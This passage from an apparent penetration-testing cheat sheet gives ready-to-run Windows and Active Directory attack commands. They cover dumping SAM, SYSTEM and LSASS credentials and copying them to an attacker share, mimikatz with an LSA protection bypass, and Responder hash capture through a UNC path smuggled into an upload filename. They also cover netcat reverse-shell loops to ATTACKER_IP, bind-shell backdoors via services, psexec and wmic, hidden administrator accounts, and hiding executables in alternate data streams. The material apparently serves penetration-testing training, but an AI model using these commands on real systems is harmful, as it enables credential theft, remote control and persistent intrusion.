reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Wifi Passwords Saved on Windows**:

```powershell
# show all saved wifi networks
netsh wlan show profiles

# get password of specific network 'WIFINAME'
wlan show profile WIFINAME key=clear

# PEAP wifi network passwords are stored in registry
# Display all keys, values and data under the PEAP profiles:
reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
reg query 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *

# Save the passwords in registry to a file
reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
```

### 4.4.3 Grabbing Hashes from Windows

```powershell
# Grab them from the registry
reg save hklm\sam %TEMP%\sam.hiv /y
reg save hklm\system %TEMP%\system.hiv /y
reg save hklm\security %TEMP%\security.hiv /y
copy %TEMP%\sam.hiv \\LISTEN_IP\share
copy %TEMP%\system.hiv \\LISTEN_IP\share
copy %TEMP%\security.hiv \\LISTEN_IP\share

# clean up stolen registry files
del %TEMP%\*.hiv

# Grab the backups from disk
copy %WINDIR%\repair\sam \\LISTEN_IP\share\sam-repair.hiv
copy %WINDIR%\repair\system \\LISTEN_IP\share\system-repair.hiv
copy %WINDIR%\repair\security \\LISTEN_IP\share\security-repair.hiv
```

Then, on attack box:

```sh
# using impacket secretsdump.py (security.hiv optional)
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
```

Alternatively, you can grab the hashes directly from LSASS.exe memory using
Sysinternals tools:

```powershell
procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
copy %TEMP%\lsass.mem \\LISTEN_IP\share
```

#### 4.4.3.1 Dumping Hashes from Windows Registry Backups

Look for these files:

```powershell
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav

%SYSTEMROOT%\ntds\ntds.dit
%WINDIR%\ntds\ntds.dit
```

#### 4.4.3.2 Dumping Hashes from Windows Domain Controller

DCSync Attack (see Active Directory - DCSync section below).

```sh
# requires authentication
impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
```

#### 4.4.3.3 Grab NTLMv2 Hashes Using Responder

Note: In addition to SMB, [Responder](https://github.com/lgandx/Responder) also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).

```sh
# start Responder
# if your victim is Windows XP/Server 2003 or earlier, add '--lm' flag
sudo responder -I tap0
# verify it shows:
# SMB server    [ON]
```

Once you have Responder's SMB server listening, you can force your victim to authenticate to you in several ways:

- With remote code execution, run `net use \\ATTACKER_IP\derp` or (PowerShell) `ls \\ATTACKER_IP\derp`.
- With ability to upload files to victim web server, **enter a non-existing file with a UNC path** like `\\ATTACKER_IP\derp\nonexistent.txt`
	- To do this, capture a normal upload with Burp, then change the "filename" field to have a UNC path. **Use double-backslashes!!** (i.e. `filename="\\\\192.168.45.192\\derp\\secrets.txt"`)
	- Here's how to do it with curl:

```sh
# Malicious file upload to non-existent UNC path, triggering NTLMv2 auth with Responder
# Change 'myFile' to the file's form-field name.
# The '@-' tells curl to take the file content from stdin,
# which is just the 'echo derp' output.
# Adding the ';filename=' coerces curl to set your custom filename in the form post
# Remember, you must use double-backslashes to escape them properly!!!
# '-x' arg passes your curl payload to Burp proxy for inspection
echo derp | curl -s -x "http://127.0.0.1:8080" -F 'myFile=@-;filename=\\\\ATTACKER_IP\\derp\\derp.txt' "http://VICTIM_IP/upload" 
```

After the victim tries to authenticate to the Responder SMB server, you should see it display the NTLMv2 hash that it captured during the handshake process:

```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
```

Copy the hash and save it to a file. Then crack it with hydra/john:

```sh
hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
```


#### 4.4.3.4 Dump Hashes and Passwords Using Crackmapexec

Probably the easiest way to grab all the hashes from a box once you have admin creds or an admin hash:

```sh
# dump SAM (using PtH)
cme smb VICTIM -u Administrator -H NTHASH --local-auth --sam

# dump LSA
cme smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa

# dump NTDS.dit
cme smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds
```


#### 4.4.3.5 Dump Hashes and Passwords Using mimikatz

[PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

To steal from LSASS, you need to be running as SYSTEM or Administrator with the `SeDebugPrivilege`.

To perform Token Elevation (i.e. to get SYSTEM), you require the `SeImpersonatePrivilege` access right.

The format of mimikatz commands is `module::command`.

```powershell
.\mimikatz.exe
# start logging session to file
log \\ATTACKER_IP\share\mimikatz.log
# enable full debug privileges to have access to system memory
privilege::debug
# elevate to system
token::elevate
# get hashes and try to print plaintext passwords
sekurlsa::logonpasswords
# dump hashes from SAM
lsadump::sam
# list all available kerberos tickets
sekurlsa::tickets
# List Current User's kerberos tickets
kerberos::list
# tries to extract plaintext passwords from lsass memory
sekurlsa::wdigest
# Get just the krbtgt kerberos tikcket
sekurlsa::krbtgt

# patch CryptoAPI to make non-exportable PKI keys exportable
crypto::capi
# patch KeyIso to make non-exportable PKI keys exportable
crypto::cng

# get google chrome saved credentials
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

If **LSA Protection** is enabled (default starting with Windows 8.1), this hampers your ability to collect hashes without first bypassing it.

```powershell
# check if LSA Protection enabled (key set to 1 or 2)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

First, make sure `mimidriver.sys` is in the current working directory (usually same as `mimikatz.exe`).

In mimikatz terminal:

```powershell
# install the mimidriver.sys on the host
!+

# remove the protection flags from lsass.exe process
!processprotect /process:lsass.exe /remove

# Finally run the logonpasswords function to dump lsass
privilege::debug    
token::elevate
sekurlsa::logonpasswords

# re-add protection flags to lsass.exe
!processprotect /process:lsass.exe

# uninstall mimidriver.sys from system
!-
```

For **Credential Guard**, you have to disable it from an elevated shell before you can start getting credentials from LSASS. Use [this script](https://www.microsoft.com/en-us/download/details.aspx?id=53337) to disable it, passing the `-Disable` flag.



## 4.5 Miscellaneous Windows Commands

cmd.exe:

```powershell
# restart/reboot the machine now
shutdown /r /t 0

# infinite loop of reverse shell command every 60 seconds
# in cmd.exe
for /l %n in () do @(
  @echo Replace with your command here...
  .\nc.exe -e cmd ATTACKER_IP 443
  timeout /t 60 /nobreak > NUL
)

# same thing, in powershell
while ($true) {start-process -NoNewWindow -file .\nc.exe -arg "-e", "cmd", "192.168.251.220", "443"; Start-Sleep -Seconds 60;}

# run regedit as SYSTEM (to view protected keys)
psexec.exe -i -s regedit.exe
# check out HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon\

# use `runas` to execute commands as another user
# requires their password. 
# Using `runas` this way requires a GUI session (RDP) to enter password in prompt.
runas /user:VICTIM cmd

# recursively list files with Alternate Data Streams
dir /s /r /a | find ":$DATA"
gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}
# print Alternate Data Stream to console
powershell get-content -path /path/to/stream/file  -stream STREAMNAME
# hide a file in an Alternate Data Stream
type evil.exe > benign.dll:evil.exe
# delete ADS from file
powershell remove-item -path /path/to/stream/file  -stream STREAMNAME

# Check if OS is 64-bit
(wmic os get OSArchitecture)[2]

# Set terminal to display ansi-colors
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1

# Current User Domain
echo %userdomain%

# manually enabling PowerShell logging
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f
```

PowerShell:

```powershell
# determine if current powershell process is 64-bit
[System.Environment]::Is64BitProcess

# determine if OS is 64-bit (various methods)
[System.Environment]::Is64BitOperatingSystem
(Get-WMIObject Win32_OperatingSystem).OSArchitecture
(Get-WMIObject CIM_OperatingSystem).OSArchitecture
(Get-WMIObject Win32_Processor).AddressWidth
[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit

# Base64 Decode
[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))

# Base64 Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("SOMETEXT"))

# Zip a directory using Powershell 3.0 (Win8)
Add-Type -A 'System.IO.Compression.FileSystem';
[IO.Compression.ZipFile]::CreateFromDirectory('C:\folder', 'C:\output.zip')

# Zip a directory using Powershell 5.0 (Win10)
Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
```

## 4.6 Windows Persistence

### 4.6.1 Add RDP User

```powershell
net user derp /add /passwordreq:no /y
net localgroup Administrators derp /add
net localgroup "Remote Desktop Users" derp /add
# enable remote desktop / enable rdp
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# delete user
net user derp /del
# disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

**Connecting via RDP:**

```sh
xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
# to attach a drive, use:
# /drive:derp,/path/to/share
```

### 4.6.2 Remote SYSTEM Backdoor

These techniques require having Admin credentials for the target machine.

#### 4.6.2.1 Backdoor Windows Services

Services give you SYSTEM access.

```powershell
# You must establish SMB session with admin creds first!!
net use \\VICTIM_NAME [PASSWORD] /u:Administrator
# or mount an smb share on the target:
net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator

# open a backdoor netcat bind-shell with system privileges on a remote host
sc \\VICTIM_NAME create derp binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"

# start the service
sc \\VICTIM_NAME start derp
# or
net start derp

# delete the service
sc \\VICTIM_NAME delete derp
```

#### 4.6.2.2 Backdoor Service with PSExec

Alternate way to create a backdoor service. Services give you SYSTEM access.

NOTE: SysInternals PSExec leaves a copy of the service on the machine after
you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
The Metasploit module and nmap NSE script clean up the service for you.

```powershell
# '-c' passes copy of command to remote systsem even if not already present
# '-s' runs command as systsem
# '-d' runs command in detached mode. Use if you want PSExec to run something
# in the background (won't wait for process to finish, nor passs input/output
# back to caller).
psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
# If username and password are omitted, psexec uses current user's creds on
# the remote machine.
```

#### 4.6.2.3 Backdoor Scheduled Tasks

Scheduled Tasks normally give you Administrator access, but you can use `/ru system` to make them give you SYSTEM access.

```powershell
# schtasks ("/ru system" runs as system)
schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
# frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle

# query schtasks
schtasks /query /s VICTIM_IP

# delete schtask ('/f' to force)
schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME

# at (deprecated on newer machines, but still should work)
at \\VICTIM_IP HH:MM[A|P] COMMAND

# query at
at \\VICTIM_IP
```

### 4.6.3 Backdoor via WMIC

WMIC creates a remote process running with Administrator privileges. It's a non-persistent backdoor (doesn't survive restarts).

```powershell
# create admin bind-shell backdoor. Use '-d' for it to run without window
wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"

# delete the wmic process
wmic process where name="nc.exe" delete
```

## 4.7 Windows Files of Interest

```powershell
# GPG keys
dir /s /b /a C:\users\*.gpg
# usually under C:\Users\*\AppData\Roaming\gnupg\

# KeePass databases:
dir *.kdb /a /b /s
dir *.kdbx /a /b /s
powershell -c "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"

# XAMPP config files:
powershell -c "Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue"
# my.ini is MySQL config
# passwords.txt has default creds

# User files
powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
```



# 5 Active Directory

*Active Directory (AD)* is how Windows enterprise networks are managed. Everything in the network (computers, users, shares, etc.) is represented in AD as an object. Objects are organized under a hierarchical set of *Organizational Units (OUs)*, which act like folders in a filesystem. The *Domain Controller (DC)* is the central server that manages everything, especially access and authentication in the network. The information on the DC gives an attacker full visibility into and control of an AD Domain. The goal is to take over the DC as SYSTEM.

Members of the *Domain Admins* group have administrative privileges on the DC, so they are key targets. Large enterprises group multiple AD domains into a tree, and some go further, grouping trees into an AD forest. *Enterprise Admins* have full administrative rights over all DCs in the entire AD forest, and are the most valuable user accounts to compromise.

The *Primary Domain Controller (PDC)* is the master, and there can be only one in a domain. It's the one with the *PdcRoleOwner* property. This is the best DC to use when querying for domain information because it's the most up-to-date.

*Lightweight Directory Access Protocol (LDAP)* is the protocol used to query and communicate with Active Directory. To communicate to a host (DC) using LDAP, we need to use it's Active Directory Services Path (ADSPath), which looks like:

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```

We need three parameters for a full LDAP path: _HostName_ (hostname, domain name, or IP), _PortNumber_ (usually defaults are fine), and a _DistinguishedName (DN)_.

A DistinguishedName is basically a full domain name, split on periods with "DC=", "OU=", or "CN=" inserted before each component. "DC" is the Domain Component, "OU" is the Organizational Unit, and "CN" is the Common Name (an object identifier). For example: `CN=Stephanie,CN=Users,DC=corp,DC=com` could translate to the domain name `stephanie.users.corp.com`. Note that domain names in AD can represent any object in the  AD domain (users included).

In Windows, *Active Directory Services Interface (ADSI)* is a set of COM interfaces that acts as an LDAP provider for programatic communication over LDAP (e.g. via .NET/PowerShell).

When trying to access an object (like a share drive) in AD, permissions are managed by *Access Control Lists (ACLs)*, which are composed of *Access Control Entries (ACEs)*. ACEs can be configured to provide many different **permission types**. From an attacker perspective, these are the most interesting ones:
- *GenericAll*: Full permissions over object
- *GenericWrite*: Edit certain attributes of the object
- *WriteOwner*: Change ownership of the object
- *WriteDACL*: Edit ACE's applied to object
- *AllExtendedRights*: Change password, reset password, etc.
- *ForceChangePassword*: Password change for object
- *Self* (Self-Membership): Add ourselves to, for example, a group


## 5.1 Active Directory Enumeration

Checklist:
- [ ] Known DC vulnerabilities:
	- [ ] Zerologon
	- [ ] PetitPotam
	- [ ] NoPAC (once you have a user's creds)
- [ ] Kerberoastable accounts
- [ ] AS-REP Roastable accounts
- [ ] Find computers where Domain Users can RDP
- [ ] Find computers where Domain Users are Local Admin
- [ ] Shortest Path to Domain Admins (esp. from Owned Principals)
- [ ] Write-permissions on any critical accounts?
- [ ] Enumerate:
	- [ ] Users (interesting permissions)
	- [ ] Groups (memberships)
	- [ ] Services (which hosts? users w/ SPNs?)
	- [ ] Computers (which ones have useful sessions?)

When you start your internal pentest, these are the first modules you should try:

```sh
# Zerologon
crackmapexec smb DC_IP -u '' -p '' -M zerologon

# PetitPotam
crackmapexec smb DC_IP -u '' -p '' -M petitpotam

# NoPAC (requires credentials)
crackmapexec smb DC_IP -u 'user' -p 'pass' -M nopac
```


Before starting enumeration, get the tools you might need ready:

```sh
# WinPEAS for automated Windows enumeration
wget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

# PowerUp for Winodws privilege escalation
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .

# PowerView for manual AD enumeration
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
chmod -x PowerView.ps1

# SharpHound for automated AD enumeration
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

# sysinternals suite in case you need it
wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals sysinternals.zip

# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens
cp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
wget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip -d mimikatz mimikatz.zip

# Rubeus.exe for AS-REP roasting, etc.
wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# windapsearch for LDAP enumeration
wget -O windapsearch https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64
chmod +x windapsearch

# plink.exe for port redirection/tunneling
cp /usr/share/windows-resources/binaries/plink.exe .
chmod -x plink.exe

# nc.exe for reverse/bind shells and port redirection
cp /usr/share/windows-resources/binaries/nc.exe .
chmod -x nc.exe

# chisel for port redirection/tunneling
/mnt/share/cheat/tools/get-chisel.sh || (
	echo 'DOWNLOAD chisel!'
	echo 'https://github.com/jpillora/chisel/releases'
)

# host the files on a Windows 10+ compatible SMB share
impacket-smbserver -smb2support -user derp -password herpderp share .
```

Manual enumeration commands:

```powershell
# What Active Directory Domain you belong to
wmic computersystem get domain
systeminfo | findstr /B /C:"Domain"

# Which Domain Controller you're authenticated to (logonserver)
set l
nltest /dsgetdc:DOMAIN.TLD

# View Domain Users
net user /domain

# View info about specific domain user
net user derpadmin /domain

# View Domain Groups
net group /domain

# View Members of specific Domain Group
# (examples are valuable default groups)
net group /domain "Domain Admins"
net group /domain "Enterprise Admins"
net group /domain "Domain Controllers" # which machines the DCs are
net group /domain "Domain Computers" # all computers in the domain
net group /domain "Administrators"
net group /domain "Remote Desktop Users"
net group /domain "Remote Management Users"

# View high-level info about current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# view info about primary DC
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner

# look up info on specific service account
setspn -L iis_service
```

One-liner to list local administrators on another computer (you must be admin of that computer to do so):

```powershell
# change COMPUTERNAME to whatever
Get-CimInstance -Computer COMPUTERNAME -Class Win32_GroupUser|?{$_.GroupComponent.Name -eq "Administrators"}|%{$_.PartComponent.Name}
```

Here's a quick script to list the local administrators of all hosts in a domain:

```powershell
$LocalGroup = 'Administrators'
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p)
$s=New-Object System.DirectoryServices.DirectorySearcher($d)
$s.filter="(objectCategory=computer)"
$computers=$s.FindAll()|%{$_.Properties.cn}
foreach ($c in $computers) {
  echo "`r`n==========   $c   =========="
  try {
    $grp=[ADSI]("WinNT://$c/$LocalGroup,Group")
    $mbrs=$grp.PSBase.Invoke('Members')
    $mbrs|%{$_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)}
  } catch {
    echo "[x] ERROR retrieving group members"
    continue
  }
}
```


### 5.1.1 Quick Active Directory Enumeration Script

This script will provide a quick listing of all computers, users, service
accounts, groups and memberships on an Active Directory domain.

This script was adapted from one written by Cones, who modified the example code provided in the PWK course materials.

```powershell
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p)
$s=New-Object System.DirectoryServices.DirectorySearcher($d)
write-host "==========    PRIMARY DC    ==========";
$pdc|select Name,IPAddress,OSVersion,SiteName,Domain,Forest|format-list
write-host "==========    COMPUTERS    ==========";
$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    USERS    ==========";
$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    SERVICES    ==========";
$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    GROUPS    ==========";
$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    MEMBERSHIP    ==========";
function _r {
  param($o,$m);
  if ($o.Properties.member -ne $null) {
    $lm=[System.Collections.ArrayList]@();
    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
    $lm=$lm|select -unique;
    $m.add((New-Object psobject -Property @{
      OU = $o.Properties.name[0]
      M = [string]::Join(", ",$lm)
    }));
    $lm | ?{
      $s.filter=[string]::Format("(name={0})",$_);
      $s.FindAll()|?{_r $_ $m | out-null};
    }
  }
}
$m=[System.Collections.ArrayList]@();
$s.FindAll()|?{_r $_ $m | out-null};
$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
```


### 5.1.2 Domain Enumeration with PowerView

PowerView is a PowerShell script that makes enumerating Active Directory much easier. To see a list of all available functions, see the [documentation](https://powersploit.readthedocs.io/en/latest/Recon/).

To get a copy on Kali for transfer to your victim:

```sh
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

# also grab sysinternals suite in case you need it
wget https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals SysinternalsSuite.zip

impacket-smbserver -smb2support -user derp -password herpderp share .
```

Usage (some commands may take a minute or two to complete):

```powershell
# stop complaints about running downloaded scripts
powershell -ep bypass

# connect to attacker SMB share
net use \\ATTACKER_IP herpderp /user:derp

# load all the functions from PowerView into your session
Import-Module \\ATTACKER_IP\share\PowerView.ps1

# basic info about the current domain
Get-Domain

# list all domain controllers
Get-DomainController


# List AS-REP Roastable users
Get-DomainUser -PreauthNotRequired | select samaccountname
# Kerberoast all kerberoastable users
Invoke-Kerberoast | fl
# Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts. (takes time)
Invoke-UserHunter -CheckAccess
# complete information about a single user to view available fields
Get-NetUser | Select -First 1
# complete information about specific user
Get-NetUser USERNAME
# list of all usernames with last logon and password set times
Get-NetUser | select samaccountname,pwdlastset,lastlogon

# list of all service accounts, or Service Principal Names (SPNs)
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Find interesting ACLs (takes time)
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights | fl
# list of all ACEs (permissions) for specific user
Get-ObjectAcl -Identity USER_OR_GROUP_NAME
# filter list for "interesting" permissions
Get-ObjectAcl -Identity "Management Department" | ? {"GenericAll","GenericWrite","WriteOwner","WriteDACL","AllExtendedRights","ForceChangePassword","Self" -eq $_.ActiveDirectoryRights} | % {[pscustomobject]@{Name=$_.SecurityIdentifier|Convert-SidToName;Permissions=$_.ActiveDirectoryRights}}

# convert SID to name (useful for translating Get-ObjectAcl output)
Convert-SidToName SID

# list of all group names
Get-NetGroup | select samaccountname,description
# all members of specific group
Get-DomainGroupMember "Domain Admins" | select membername

# enumerates the local groups on the local (or remote) machine
# same as 'net localgroup' command, but for remote computers
Get-NetLocalGroup -ComputerName NAME

# list all computers
Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
# get all IP addresses and hostnames
resolve-ipaddress @(Get-DomainComputer|%{$_.dnshostname})
# get IP of specific computer
Resolve-IPAddress -ComputerName NAME

# finds machines on the local domain where the current user has local administrator access
Find-LocalAdminAccess
# finds reachable shares on domain machines
Find-DomainShare
Find-DomainShare -CheckShareAccess|fl # only list those we can access
# finds domain machines where specific users are logged into
Find-DomainUserLocation
# enumerates the members of specified local group on machines in the domain
Find-DomainLocalGroupMember
# finds domain machines where specific processes are currently running
Find-DomainProcess

# returns users logged on the local (or a remote) machine
Get-NetLoggedon
# enumerates members of a specific local group on the local (or remote) machine
Get-NetLocalGroupMember
# returns open shares on the local (or a remote) machine
Get-NetShare
# returns session information for the local (or a remote) machine
# queries registry key: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\SrvsvcSessionInfo
# which is locked down to Admins starting with Win10-1709 and Server2019-1809, so won't work
Get-NetSession -ComputerName NAME -Verbose
# if Get-NetSession doesn't work, try PsLoggedon.exe from Sysinternals
# (requires Remote Registry service to be enabled):
.\PsLoggedon.exe \\HOSTNAME

# list all sites in domain
Get-DomainSite | select cn
# list all subnets
Get-DomainSubnet
```


### 5.1.3 Domain Enumeration with BloodHound

BloodHound lets you perform graph-analysis on Active Directory to map out the domain and find attack paths. Its companion, SharpHound, performs the preliminary data collection on a Windows domain host.

On the victim machine:

```powershell
# stop complaints about running downloaded scripts
powershell -ep bypass

# connect to attacker SMB share
net use \\ATTACKER_IP herpderp /user:derp

# load all the functions from SharpHound into your session
Import-Module \\ATTACKER_IP\share\SharpHound.ps1

# collect all the data (except local group policies)
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\ATTACKER_IP\share -ZipFileName "derphound.zip"
```

On the attacker machine:

```sh
# start the neo4j server
sudo neo4j start

# browse to neo4j webUI to configure a password
firefox http://localhost:7474
# log in with neo4j:neo4j
# and change password to whatever you want (remember for later!)

# now that neo4j is running, start bloodhound
bloodhound
# configure it to log into local neo4j server using approriate URL and creds
# URL: bolt://localhost:7687
```

Upload your zip file by clicking the "Upload Data" button from the top-right set of menu buttons (looks like an up arrow in a circle), and wait for database to get updated.

Go to the Analysis tab under the search bar's hamburger menu.

![](assets/bloodhound-analysis-tab.png)

The _Find Shortest Paths to Domain Admins_ query is a very handy one:

![](assets/bloodhound-shortest-path-domain-admin.png)

Clicking on any node brings up its "Node Info" tab under the search bar, which contains lots of details about the node.

💡 **TIP**: It's a good idea to check the details of users/groups/computers you control. Especially look at the *Outbound Object Control* and *Local Admin Rights*.

If you right-click an edge (line) between two nodes and click `? Help`, BloodHound will show additional information:

![](assets/bloodhound-link-help.png)

In the same Help modal, check out the *Abuse* tab for tips on how to exploit this link.

The _Shortest Paths to Domain Admins from Owned Principals_ query is also amazing. Before you use it, you must right-click on every node that you "own" (e.g. user accounts, computers), and mark it as owned.

Alternatively, you can right-click on any node and click "Shortest Paths To Here".

There are four **keyboard shortcuts** when the graph rendering area has focus:

- <kbd>Ctrl</kbd>: Cycle through the three different node label display settings - default, always show, always hide.
- <kbd>Space</kbd>: Bring up the spotlight window, which lists all nodes that are currently drawn. Click an item in the list and the GUI will zoom into and briefly highlight that node.
- <kbd>Backspace</kbd>: Go back to the previous graph result rendering. This is the same functionality as clicking the Back button in the search bar.
- <kbd>s</kbd>: Toggle the expansion or collapse of the information panel below the search bar. This is the same functionality as clicking the More Info button in the search bar.

You can constrain your searches in the search bar with tags for the node-type like `user:WHATEVER`. Allowed tags/node-types are:
- Group
- Domain
- Computer
- User
- OU
- GPO
- Container

From the search bar, you can also click the "Pathfinding" button (looks like a road into the distance) to tell it to search from/to the node you select from the search.

💡 **TIP**: [`bloodhound.py`](https://github.com/fox-it/BloodHound.py) (unofficial tool) lets you collect/ingest most of the same active directory information as SharpHound, but you can run it straight from your Kali box. It requires at least a domain user's credentials and the ability to reach/query the appropriate DC.

When you're finished with BloodHound, clear the database by going to the search bar's hamburger menu > Database Info tab, scroll to bottom and click "**Clear Database**" button.


## 5.2 Attacking Active Directory Authentication

Kerberos is the "preferred" (default and most secure) authentication method in Active Directory. Other methods include LM (LAN Manager), NTLM (New Technology LAN Manager), and NTLMv2. LM and NTLM are legacy protocols disabled by default in modern systems, but they are provided for backwards compatibility. For the rest of this section, I'll refer to NTLMv2 as NTLM.

